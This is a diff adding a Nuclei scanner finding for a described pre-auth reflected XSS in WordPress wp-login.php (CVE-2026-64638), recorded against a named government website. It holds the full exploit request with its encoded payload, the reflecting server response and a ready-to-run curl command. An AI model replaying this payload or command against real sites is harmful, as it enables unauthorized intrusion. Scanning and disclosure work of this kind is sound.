@@ -1,3 +1,66 @@
 [
-  []
+  [
+    {
+      "template": "http/cves/2026/CVE-2026-64638.yaml",
+      "template-url": "https://cloud.projectdiscovery.io/public/CVE-2026-64638",
+      "template-id": "CVE-2026-64638",
+      "template-path": "/home/runner/nuclei-templates/http/cves/2026/CVE-2026-64638.yaml",
+      "info": {
+        "name": "WordPress Core < 7.0.3 - Preauth Reflected XSS (XSS2Shell)",
+        "author": [
+          "flx | nick vidovic (greenhats)"
+        ],
+        "tags": [
+          "cve",
+          "cve2026",
+          "wordpress",
+          "xss",
+          "rce",
+          "pwnai"
+        ],
+        "description": "Pre-authentication reflected XSS in WordPress wp-login.php (CVE-2026-64638).\nThe flaw exploits a parser differential between PHP strip_tags() and\nWordPress KSES. Tags with whitespace after < (e.g. \"< area\") survive\nstrip_tags() but are normalized to valid HTML by KSES, leading to\nattacker-controlled DOM elements that trigger automatic JavaScript\nexecution via user-profile.js. No user interaction required.\nAffects all WordPress versions < 7.0.3.\n",
+        "impact": "Attackers can execute scripts leading to remote code execution via social engineering and victim interaction.\n",
+        "reference": [
+          "https://pwn.ai/blog/xss2shell",
+          "https://thehackernews.com/2026/08/new-wordpress-pre-auth-xss-could-lead.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-64638",
+          "https://wordpress.org/news/2026/08/wordpress-7-0-3-release/"
+        ],
+        "severity": "high",
+        "metadata": {
+          "max-request": 3,
+          "shodan-query": "http.component:\"wordpress\"",
+          "verified": true
+        },
+        "classification": {
+          "cve-id": [
+            "cve-2026-64638"
+          ],
+          "cwe-id": [
+            "cwe-79"
+          ],
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+          "cvss-score": 8.9,
+          "epss-score": 0.31204,
+          "epss-percentile": 0.98171
+        },
+        "remediation": "Upgrade WordPress to 7.0.3 or apply the backported security patch.\n"
+      },
+      "type": "http",
+      "host": "www.fabrique.social.gouv.fr",
+      "port": "443",
+      "scheme": "https",
+      "url": "https://www.fabrique.social.gouv.fr",
+      "matched-at": "https://www.fabrique.social.gouv.fr/wp-login.php",
+      "extracted-results": [
+        "<area id=\"ajaxurl\" href=\"/?rest_route=/&amp;_method=GET&amp;_jsonp=alert\">"
+      ],
+      "request": "POST /wp-login.php HTTP/1.1\r\nHost: www.fabrique.social.gouv.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nContent-Length: 242\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: ***\r\nAccept-Encoding: gzip\r\n\r\nlog=%3C%20area%20id%3Dajaxurl%20href%3D%2F%3Frest_route%3D%2F%26_method%3DGET%26_jsonp%3Dalert%3E%3C%20div%20id%3Dcolor-picker%20class%3Dreset-pass-submit%3E%3C%20button%20class%3D%22wp-generate-pw%20color-option%22%3EX&pwd=x&wp-submit=Log+In",
+      "response": "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nCache-Control: no-cache, must-revalidate, max-age=0\r\nContent-Security-Policy: *\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 20 Sep 2026 04:45:45 GMT\r\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\r\nServer: nginx\r\nSet-Cookie: ***\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: sameorigin\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n\t<html lang=\"fr-FR\">\n\t<head>\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n\t<title>Log In &lsaquo; La Fabrique numérique des ministères sociaux &#8212; WordPress</title>\n\t<meta name='robots' content='max-image-preview:large, noindex, noarchive' />\n<script></script><link rel='stylesheet' id='dashicons-css' href='https://www.fabrique.social.gouv.fr/wp-includes/css/dashicons.min.css?ver=6.5.4' type='text/css' media='all' />\n<link rel='stylesheet' id='buttons-css' href='https://www.fabrique.social.gouv.fr/wp-includes/css/buttons.min.css?ver=6.5.4' type='text/css' media='all' />\n<link rel='stylesheet' id='forms-css' href='https://www.fabrique.social.gouv.fr/wp-admin/css/forms.min.css?ver=6.5.4' type='text/css' media='all' />\n<link rel='stylesheet' id='l10n-css' href='https://www.fabrique.social.gouv.fr/wp-admin/css/l10n.min.css?ver=6.5.4' type='text/css' media='all' />\n<link rel='stylesheet' id='login-css' href='https://www.fabrique.social.gouv.fr/wp-admin/css/login.min.css?ver=6.5.4' type='text/css' media='all' />\n\t<meta name='referrer' content='strict-origin-when-cross-origin' />\n\t\t<meta name=\"viewport\" content=\"width=device-width\" />\n\t<link rel=\"icon\" href=\"https://www.fabrique.social.gouv.fr/app/uploads/2024/03/cropped-faviconV2-32x32.png\" sizes=\"32x32\" />\n<link rel=\"icon\" href=\"https://www.fabrique.social.gouv.fr/app/uploads/2024/03/cropped-faviconV2-192x192.png\" sizes=\"192x192\" />\n<link rel=\"apple-touch-icon\" href=\"https://www.fabrique.social.gouv.fr/app/uploads/2024/03/cropped-faviconV2-180x180.png\" />\n<meta name=\"msapplication-TileImage\" content=\"https://www.fabrique.social.gouv.fr/app/uploads/2024/03/cropped-faviconV2-270x270.png\" />\n\t</head>\n\t<body class=\"login no-js login-action-login wp-core-ui  locale-fr-fr\">\n\t<script type=\"text/javascript\">\n/* <![CDATA[ */\ndocument.body.className = document.body.className.replace('no-js','js');\n/* ]]> */\n</script>\n\n\t\t<div id=\"login\">\n\t\t<h1><a href=\"https://wordpress.org/\">Powered by WordPress</a></h1>\n\t<div id=\"login_error\" class=\"notice notice-error\"><p><strong>Error:</strong> The username <strong><area id=\"ajaxurl\" href=\"/?rest_route=/&amp;_method=GET&amp;_jsonp=alert\"><div id=\"color-picker\" class=\"reset-pass-submit\"><button class=\"wp-generate-pw color-option\">X</strong> is not registered on this site. If you are unsure of your username, try your email address instead.</p></div>\n\t\t<form name=\"loginform\" id=\"loginform\" action=\"https://www.fabrique.social.gouv.fr/wp-login.php\" method=\"post\">\n\t\t\t<p>\n\t\t\t\t<label for=\"user_login\">Username or Email Address</label>\n\t\t\t\t<input type=\"text\" name=\"log\" id=\"user_login\" aria-describedby=\"login_error\" class=\"input\" value=\"\" size=\"20\" autocapitalize=\"off\" autocomplete=\"username\" required=\"required\" />\n\t\t\t</p>\n\n\t\t\t<div class=\"user-pass-wrap\">\n\t\t\t\t<label for=\"user_pass\">Password</label>\n\t\t\t\t<div class=\"wp-pwd\">\n\t\t\t\t\t<input type=\"password\" name=\"pwd\" id=\"user_pass\" aria-describedby=\"login_error\" class=\"input password-input\" value=\"\" size=\"20\" autocomplete=\"current-password\" spellcheck=\"false\" required=\"required\" />\n\t\t\t\t\t<button type=\"button\" class=\"button button-secondary wp-hide-pw hide-if-no-js\" data-toggle=\"0\" aria-label=\"Show password\">\n\t\t\t\t\t\t<span class=\"dashicons dashicons-visibility\" aria-hidden=\"true\"></span>\n\t\t\t\t\t</button>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t\t\t\t<p class=\"forgetmenot\"><input name=\"rememberme\" type=\"checkbox\" id=\"rememberme\" value=\"forever\"  /> <label for=\"rememberme\">Remember Me</label></p>\n\t\t\t<p class=\"submit\">\n\t\t\t\t<input type=\"submit\" name=\"wp-submit\" id=\"wp-submit\" class=\"button button-primary button-large\" value=\"Log In\" />\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" name=\"redirect_to\" value=\"https://www.fabrique.social.gouv.fr/wp-admin/\" />\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" name=\"testcookie\" value=\"1\" />\n\t\t\t</p>\n\t\t</form>\n\n\t\t\t\t\t<p id=\"nav\">\n\t\t\t\t<a class=\"wp-login-lost-password\" href=\"https://www.fabrique.social.gouv.fr/wp-login.php?action=lostpassword\">Lost your password?</a>\t\t\t</p>\n\t\t\t<script type=\"text/javascript\">\n/* <![CDATA[ */\nfunction wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( \"user_login\" );d.value = \"\";d.focus(); d.select();} catch( er ) {}}, 200);}\nwp_attempt_focus();\nif ( typeof wpOnload === 'function' ) { wpOnload() }\n/* ]]> */\n</script>\n\t\t<p id=\"backtoblog\">\n\t\t\t<a href=\"https://www.fabrique.social.gouv.fr/\">&larr; Go to La Fabrique numérique des ministères sociaux</a>\t\t</p>\n\t\t\t</div>\n\t\t\t<script type=\"text/javascript\">\n/* <![CDATA[ */\ndocument.querySelector('form').classList.add('shake');\n/* ]]> */\n</script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/jquery/jquery.min.js?ver=3.7.1\" id=\"jquery-core-js\"></script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1\" id=\"jquery-migrate-js\"></script>\n<script type=\"text/javascript\" id=\"zxcvbn-async-js-extra\">\n/* <![CDATA[ */\nvar _zxcvbnSettings = {\"src\":\"https:\\/\\/www.fabrique.social.gouv.fr\\/wp-includes\\/js\\/zxcvbn.min.js\"};\n/* ]]> */\n</script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/zxcvbn-async.min.js?ver=1.0\" id=\"zxcvbn-async-js\"></script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2\" id=\"wp-polyfill-inert-js\"></script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.14.0\" id=\"regenerator-runtime-js\"></script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0\" id=\"wp-polyfill-js\"></script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/dist/hooks.min.js?ver=2810c76e705dd1a53b18\" id=\"wp-hooks-js\"></script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6\" id=\"wp-i18n-js\"></script>\n<script type=\"text/javascript\" id=\"wp-i18n-js-after\">\n/* <![CDATA[ */\nwp.i18n.setLocaleData( { 'text direction\\u0004ltr': [ 'ltr' ] } );\n/* ]]> */\n</script>\n<script type=\"text/javascript\" id=\"password-strength-meter-js-extra\">\n/* <![CDATA[ */\nvar pwsL10n = {\"unknown\":\"Password strength unknown\",\"short\":\"Very weak\",\"bad\":\"Weak\",\"good\":\"Medium\",\"strong\":\"Strong\",\"mismatch\":\"Mismatch\"};\n/* ]]> */\n</script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-admin/js/password-strength-meter.min.js?ver=6.5.4\" id=\"password-strength-meter-js\"></script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/underscore.min.js?ver=1.13.4\" id=\"underscore-js\"></script>\n<script type=\"text/javascript\" id=\"wp-util-js-extra\">\n/* <![CDATA[ */\nvar _wpUtilSettings = {\"ajax\":{\"url\":\"\\/wp-admin\\/admin-ajax.php\"}};\n/* ]]> */\n</script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-includes/js/wp-util.min.js?ver=6.5.4\" id=\"wp-util-js\"></script>\n<script type=\"text/javascript\" id=\"user-profile-js-extra\">\n/* <![CDATA[ */\nvar userProfileL10n = {\"user_id\":\"0\",\"nonce\":\"12754d61cd\"};\n/* ]]> */\n</script>\n<script type=\"text/javascript\" src=\"https://www.fabrique.social.gouv.fr/wp-admin/js/user-profile.min.js?ver=6.5.4\" id=\"user-profile-js\"></script>\n<script></script>\t</body>\n\t</html>\n\t",
+      "ip": "154.41.70.5",
+      "timestamp": "2026-09-20T04:45:45.529755092Z",
+      "curl-command": "curl -X 'POST' -d 'log=%3C%20area%20id%3Dajaxurl%20href%3D%2F%3Frest_route%3D%2F%26_method%3DGET%26_jsonp%3Dalert%3E%3C%20div%20id%3Dcolor-picker%20class%3Dreset-pass-submit%3E%3C%20button%20class%3D%22wp-generate-pw%20color-option%22%3EX&pwd=x&wp-submit=Log+In' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: ***' -H 'Host: www.fabrique.social.gouv.fr' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://www.fabrique.social.gouv.fr/wp-login.php'",
+      "matcher-status": true
+    }
+  ]
 ]
